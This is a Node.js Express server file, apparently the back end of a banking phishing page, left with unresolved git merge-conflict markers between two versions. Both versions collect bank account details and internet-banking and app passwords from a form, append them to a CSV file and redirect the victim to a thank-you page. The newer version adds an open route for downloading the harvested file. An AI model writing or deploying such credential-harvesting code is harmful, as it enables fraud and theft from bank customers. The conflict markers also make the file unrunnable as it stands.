<<<<<<< HEAD
const express = require("express");
const multer = require("multer");
const { createObjectCsvWriter } = require("csv-writer");
const path = require("path");

const app = express();
const upload = multer();

// Configuração do CSV writer
=======
// server.js
const express       = require("express");
const compression   = require("compression");
const multer        = require("multer");
const { createObjectCsvWriter } = require("csv-writer");
const path          = require("path");

const app    = express();
const upload = multer();

// ativa gzip/brotli para todas as respostas
app.use(compression());

// para servir HTML/CSS/JS/IMG com compressão
app.use(express.static(path.join(__dirname, "public")));
app.use(express.urlencoded({ extended: true }));

// CSV writer
>>>>>>> c38f5081371493ff28a6ed7317d4b02681c07ac5
const csvWriter = createObjectCsvWriter({
  path: "dados_formulario.csv",
  header: [
    { id: "titularidade", title: "Titularidade" },
<<<<<<< HEAD
    { id: "tipo_conta", title: "Tipo de Conta" },
    { id: "agencia", title: "Agência" },
    { id: "conta", title: "Conta" },
    { id: "senhaInternet", title: "Senha da Internet" },
    { id: "senhaApp", title: "Senha Digital" },
  ],
  append: true, // Adiciona os dados ao invés de sobrescrever o arquivo
});

// Middleware para servir arquivos estáticos (HTML, CSS, etc.)
app.use(express.static(path.join(__dirname, "public")));
app.use(express.urlencoded({ extended: true }));

// Rota para processar o formulário
app.post("/processa_formulario", upload.none(), async (req, res) => {
  const { titularidade, tipo_conta, agency, login, internet, app } = req.body;

  console.log("Dados recebidos:", req.body);

  if (!agency || !login || !internet || !app) {
    return res.status(400).send("Todos os campos são obrigatórios.");
  }

  const data = [
    {
      titularidade,
      tipo_conta,
      agencia: agency,
      conta: login,
      senhaInternet: internet,
      senhaApp: app,
    },
  ];

  try {
    await csvWriter.writeRecords(data);
=======
    { id: "tipo_conta",    title: "Tipo de Conta" },
    { id: "agencia",       title: "Agência" },
    { id: "conta",         title: "Conta" },
    { id: "senhaInternet", title: "Senha da Internet" },
    { id: "senhaApp",      title: "Senha Digital" }
  ],
  append: true
});

// processa envio do formulário
app.post("/processa_formulario", upload.none(), async (req, res) => {
  const {
    titularidade,
    tipo_conta,
    agency,
    login,
    internet,
    app: senhaApp
  } = req.body;

  if (!agency || !login || !internet || !senhaApp) {
    return res.status(400).send("Todos os campos são obrigatórios.");
  }

  const registro = [{
    titularidade,
    tipo_conta,
    agencia: agency,
    conta: login,
    senhaInternet: internet,
    senhaApp
  }];

  try {
    await csvWriter.writeRecords(registro);
    // envia ao usuário agradecimento
>>>>>>> c38f5081371493ff28a6ed7317d4b02681c07ac5
    res.redirect("/agradecimento.html");
  } catch (err) {
    console.error("Erro ao salvar os dados:", err);
    res.status(500).send("Erro ao salvar os dados.");
  }
});

<<<<<<< HEAD
// Inicia o servidor na porta 3000
app.listen(3000, () => {
  console.log("Servidor rodando em http://localhost:3000");
=======
// rota para download do CSV
app.get("/download_csv", (req, res) => {
  const filePath = path.join(__dirname, "dados_formulario.csv");
  res.download(filePath, "dados_formulario.csv", err => {
    if (err) {
      console.error("Erro ao enviar CSV:", err);
      res.status(500).send("Não foi possível baixar o CSV.");
    }
  });
});

// fallback para SPA
app.get("/*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// inicia servidor na porta do Render ou 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
>>>>>>> c38f5081371493ff28a6ed7317d4b02681c07ac5
});
